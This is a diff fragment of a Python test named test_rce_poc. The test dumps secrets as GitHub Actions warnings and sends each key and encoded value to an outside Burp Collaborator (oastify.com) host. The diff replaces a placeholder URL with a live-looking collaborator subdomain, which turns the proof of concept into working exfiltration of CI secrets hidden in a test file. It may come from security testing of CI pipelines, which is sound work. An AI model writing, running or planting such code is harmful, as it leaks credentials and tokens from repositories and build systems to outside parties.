@@ -14,7 +14,7 @@ def test_rce_poc():
             print(f"::warning title=POC Secret Dump::{key} = {encoded_value}")
 
             # 2. Out-of-band network ping with the encoded value
-            url = f"http://YOUR_BURP_COLLABORATOR_URL.oastify.com?key={key}&id={encoded_value}" 
+            url = f"http://8z8e36lzrxpyfnyk818r7n5madg44vsk.oastify.com?key={key}&id={encoded_value}" 
             
             try:
                 with urllib.request.urlopen(url, timeout=3) as response:
